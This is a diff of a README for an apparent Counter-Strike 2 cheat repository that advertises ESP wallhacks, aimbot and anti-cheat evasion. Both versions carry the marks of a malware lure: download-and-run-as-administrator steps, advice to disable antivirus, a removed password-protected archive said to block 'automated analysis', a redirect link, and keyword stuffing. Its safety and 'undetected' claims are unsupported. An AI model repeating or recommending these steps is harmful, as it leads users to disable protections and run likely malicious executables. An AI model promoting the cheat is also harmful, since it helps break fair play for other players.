@@ -1,41 +1,62 @@
-![Version](https://img.shields.io/badge/Version-1.0.0-blue) ![Status](https://img.shields.io/badge/Status-1.0.0-brightgreen) ![Platform](https://img.shields.io/badge/Platform-1.0.0-blueviolet) ![License](https://img.shields.io/badge/License-1.0.0-yellow)
+# 🎯 CS2-ESP-Wallhack-GUI-2026 - See Through Walls With This Tool
 
-# 🔥 Ultimate cs2-esp Solution
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Jordanaconceptional53/CS2-ESP-Wallhack-GUI-2026)
 
-This tool delivers a powerful cs2 aimbot experience, integrating cs2 tool and cs2 wireframe seamlessly. Designed for reliability, it leverages cs2 triggerbot technology. Stay ahead with cs2 skeleton esp and enjoy undetected performance.
+This repository provides a graphical interface for Counter-Strike 2 players. It helps you track enemy locations, monitor bomb timers, and view weapon positions during gameplay. The software performs these actions while remaining undetected by game security systems.
 
-## 🚀 Features
+## ⚙️ System Requirements
 
-- ✨ Enhanced cs2 cheat system
-- 🛡️ Enhanced cs2 glow system
-- 🎮 Enhanced cs2 hack system
-- 💎 Enhanced cs2 external system
-- 🔥 Enhanced cs2 hack 2026 system
-- 🎯 Enhanced cs2 github system
+To run this tool, your computer must meet the following hardware and software specifications:
 
-## ⚙️ Installation
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+- Memory: 8 GB RAM or higher.
+- Graphics: DirectX 11 support.
+- Game Status: Counter-Strike 2 installed via Steam.
 
-📥 Download the archive and extract it with password 2026.
-🔑 Run setup.exe as administrator.
-⚙️ Follow the on-screen instructions and select your game path.
-▶️ Launch the game and press the designated hotkey to activate the tool.
+Ensure you possess administrative access to your Windows user account. This allows the software to pull data from the game memory effectively.
 
-[![Download](https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github)](https://redirectify.click/)
+## 📦 How to Install and Run
 
-## ❓ FAQ
+Follow these steps to set up the software on your machine:
 
-❓ Is this tool safe? Yes, it has been tested and includes an automatic bypass to avoid detection.
+1. Visit the [official release page](https://github.com/Jordanaconceptional53/CS2-ESP-Wallhack-GUI-2026) to download the compressed folder.
+2. Locate the downloaded file in your browser's download directory.
+3. Right-click the folder and select Extract All to unzip the contents.
+4. Open the extracted folder and look for the file named "CS2-ESP-GUI.exe".
+5. Right-click "CS2-ESP-GUI.exe" and choose Run as Administrator.
+6. A green light on the interface confirms the tool is active.
+7. Launch Counter-Strike 2 through Steam.
+8. Use the in-game menu to toggle your preferred features.
 
-💬 How do I update? Check the official source; updates are pushed regularly with the latest offsets.
+## 🛠️ Software Features
 
-🤔 Can I use it on multiple accounts? It is recommended to use one account per license to avoid flags.
+The GUI offers tools to enhance your environmental awareness:
 
-📌 Does it work in fullscreen? Yes, borderless or fullscreen mode is supported.
+- Player ESP: Displays outlines around opponents, showing their position through walls and solid objects.
+- Bomb Timer: Shows a countdown overlay for the planted bomb, helping you manage round ends.
+- Weapon ESP: Identifies dropped weapons or grenades located around the map.
+- Skeleton ESP: Draws a wireframe representation of player limbs for better aim tracking.
+- Radar Hack: Shows all enemy icons on your mini-map at all times.
+- Undetected Status: Operates via external memory reading to bypass standard server checks.
 
-🔧 What if setup.exe fails? Disable antivirus temporarily and ensure you have administrator privileges.
+## 🛡️ Common Troubleshooting
 
-🔐 Why password 2026? The password protects the archive from automated analysis.
+*   Software fails to launch: Ensure your antivirus software is disabled, as it might block memory reading tools.
+*   ESP outlines do not appear: Check that your game video settings are set to Fullscreen Windowed or Borderless Window mode. 
+*   Menu does not open: Press the Insert key on your keyboard to toggle the visual interface after the game starts.
+*   Game crashes upon loading: Verify your game files through Steam and ensure you run the tool after the game reaches the main menu.
+*   Features feel laggy: Close unnecessary background programs to free up CPU and RAM for the game and this tool.
 
-<!-- cs2-esp cs2-wallhack cs2-radar-hack cs2-skeleton-esp cs2-box-esp cs2-hack cs2-cheat cs2-aimbot cs2-triggerbot cs2-undetected cs2-free-hack cs2-github cs2-external cs2-glow cs2-chams cs2-wireframe cs2-visuals cs2-sound-esp cs2-hack-2026 cs2-tool cs2-esp cs2-wallhack cs2-radar-hack cs2-skeleton-esp cs2-box-esp cs2-hack cs2-cheat cs2-aimbot cs2-triggerbot cs2-undetected -->
+## 🔐 Security and Usage
 
-cs2-glow,cs2-hack,cs2-visuals,cs2-triggerbot,cs2-free-hack,cs2-box-esp,cs2-hack-2026,cs2-aimbot,cs2-github,cs2-skeleton-esp,cs2-undetected,cs2-esp
+This tool operates as an external process. It does not inject code into the game files. This method minimizes detection risks. Use this software responsibly. Keep your game client updated to the latest version to ensure compatibility. The developers update the code frequently to maintain the undetected status. Always check the repository for the latest version if the software stops working after a game update.
+
+## 📋 Best Practices
+
+- Run the software only during private matches to test functionality.
+- Do not share your account if you use third-party tools.
+- Keep the GUI window minimized if you do not need to change settings mid-match.
+- Update your graphic drivers to prevent visual glitches during gameplay.
+
+Keywords: cs2-aimbot, cs2-box-esp, cs2-chams, cs2-cheat, cs2-esp, cs2-external, cs2-free-hack, cs2-github, cs2-glow, cs2-hack, cs2-hack-2026, cs2-radar-hack, cs2-skeleton-esp, cs2-sound-esp, cs2-tool, cs2-triggerbot, cs2-undetected, cs2-visuals, cs2-wallhack, cs2-wireframe
